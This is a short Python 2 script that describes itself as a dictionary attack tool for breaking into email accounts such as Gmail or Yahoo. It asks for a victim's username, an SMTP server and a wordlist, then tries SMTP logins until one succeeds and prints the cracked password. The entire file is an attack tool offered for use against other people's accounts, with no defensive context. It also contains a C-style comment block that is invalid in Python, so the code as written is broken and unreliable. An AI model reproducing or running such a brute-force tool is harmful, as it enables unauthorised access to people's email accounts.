
import smtplib, email,sys
/*
 * This is dictionary attack script
 * for targetting email servies like gmail or yahoo
 * 
 * @Author Mohit Malhotra
 */
head=" DICTIONARY ATTACK SCRIPT "
header=head.upper()

print """
"""+header.center(75,'-')+"""

"""


vicname=raw_input("ENTER THE VICTIM'S USERNAME : ")
vicserver=raw_input("ENTER THE SMTP SERVER NAME : ")
vicport=raw_input("ENTER THE PORT TO ACCESS : ")

dictionary=raw_input("ENTER THE DICTINARY FILE PATH : ")

file = open(dictionary,"r")

for pas in file : 
	password=pas.rstrip()
	print "\n[*] Trying with the password "+password
	
	try:
		hack=smtplib.SMTP(vicserver,vicport)
		hack.ehlo()
		hack.starttls()

		hack.login(vicname,password)
		print "\n\n\n BREACH SUCCESS! PASSWORD CRACKED : "	+password

	except smtplib.SMTPAuthenticationError :
		print "\n[!] NAHH! PASSWORD INCORRECT"

raw_input ("Enter a key to exit or else type ^Z :")